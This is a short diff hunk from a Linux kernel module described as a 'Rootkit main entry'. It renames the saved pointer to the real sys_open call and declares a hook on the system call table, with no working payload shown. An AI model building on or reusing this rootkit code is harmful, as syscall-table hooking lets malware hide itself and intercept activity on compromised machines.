@@ -16,7 +16,7 @@ MODULE_DESCRIPTION("Rootkit main entry");
 static unsigned long **hook_syscall_table(void);
 
 // Real system call
-asmlinkage long (*sys_open)(const char __user *, int, umode_t);
+asmlinkage long (*kernel_sys_open)(const char __user *, int, umode_t);
 asmlinkage unsigned long **syscall_table;
  
 static int lkm_init(void)
